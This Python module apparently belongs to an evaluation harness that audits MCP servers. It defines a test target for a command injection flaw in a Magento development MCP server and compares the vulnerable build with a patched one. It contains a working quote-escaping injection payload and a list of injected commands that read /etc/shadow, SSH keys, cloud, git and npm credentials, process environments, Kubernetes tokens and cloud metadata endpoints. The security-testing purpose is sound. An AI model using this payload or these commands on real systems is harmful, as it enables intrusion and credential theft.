"""CVE-2026-5603: OS command injection in @elgentos/magento2-dev-mcp (command execution).

The vulnerable server (npm 1.0.2) builds a shell string `magerun2 db:query --format=table
"<query>"` and runs it through child_process.exec, so a `query` that closes the quote and chains a
command (`x"; <cmd>; echo __ok__ "y`) executes it. Each command-execution-reachable, plantable
catalogue place gets a dedicated exploit that reads its nonce through such an injected command
carried by the `db-query` tool. The patched commit (aa1ffcc) routes local execution through
execFile(magerunBin, args), so the same payload is passed as a literal SQL argument and nothing is
injected.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-5603-magento2"
PATCHED = "holdout-2026-5603-magento2-patched"

# place_id -> the shell command the injection runs to surface that place's nonce. Container paths
# are the planter's resolution of the coordinates ($HOME -> /tmp, the unprivileged launch home).
PLACE_COMMANDS: dict[str, str] = {
    "etc-shadow": "cat /etc/shadow",
    "process-account-identity": "id",
    "container-hostname": "cat /etc/hostname",
    "aws-credentials": "cat /tmp/.aws/credentials",
    "gcloud-adc": "cat /tmp/.config/gcloud/application_default_credentials.json",
    "azure-profile": "cat /tmp/.azure/azureProfile.json",
    "ssh-private-key": "cat /tmp/.ssh/id_rsa /tmp/.ssh/id_ed25519",
    "shell-history": "cat /tmp/.bash_history /tmp/.zsh_history",
    "git-credentials": "cat /tmp/.git-credentials",
    "npmrc": "cat /tmp/.npmrc",
    "gh-hosts": "cat /tmp/.config/gh/hosts.yml",
    "docker-config": "cat /tmp/.docker/config.json",
    "kube-config": "cat /tmp/.kube/config",
    "pgpass": "cat /tmp/.pgpass",
    "mysql-client-cnf": "cat /tmp/.my.cnf",
    "mongorc": "cat /tmp/.mongorc.js",
    "mysql-system-cnf": "cat /etc/mysql/my.cnf",
    "proc-environ": "cat /proc/self/environ",
    "run-secrets": "cat /run/secrets/db_password",
    "k8s-sa-token": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    "imds": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "ecs-task-credentials": "curl -s http://169.254.170.2/v2/credentials/",
    "eks-pod-identity": "curl -s http://169.254.170.23/v1/credentials",
    "etc-hosts": "cat /etc/hosts",
    "auth-log": "cat /var/log/auth.log /var/log/secure",
}

KEPT_PLACES: tuple[str, ...] = tuple(PLACE_COMMANDS)

AIM = re.compile(r";")  # a chained command injection carries a `;`; the benign call does not


def _payload(cmd: str) -> str:
    return f'x"; {cmd}; echo __ok__ "y'


def _make_exploit(cmd: str):
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await client.call_tool("db-query", {"query": _payload(cmd), "format": "table"})

    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    # cache:view --help: a real magerun2 invocation that exits 0 without a Magento install and
    # reaches no planted place, on both versions (no shell metacharacter -> not aimed).
    await client.call_tool("cache-view", {"key": "--help"})


TARGET = CVETarget(
    cve_id="CVE-2026-5603",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        # Unprivileged (an account place needs a non-host user). The injection is independent of
        # the working directory, so the server runs from /tmp, which the unprivileged account can
        # traverse (the /srv layout temp root is host-user 0700 and carries no kept place for this
        # reach) and which holds no docker-env marker, so the patched server takes its local
        # execFile path.
        SymbolicUser.UNPRIVILEGED,
        "/tmp",
        has_network=False,
    ),
    builder=command_injection_env,
    exploits=tuple(_make_exploit(PLACE_COMMANDS[pid]) for pid in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the db-query tool interpolates its attacker-controlled query into a "
        "shell string run with child_process.exec, so a query that closes the quote and chains a "
        "command executes it in the server's container."
    ),
    tools_filter=None,
)
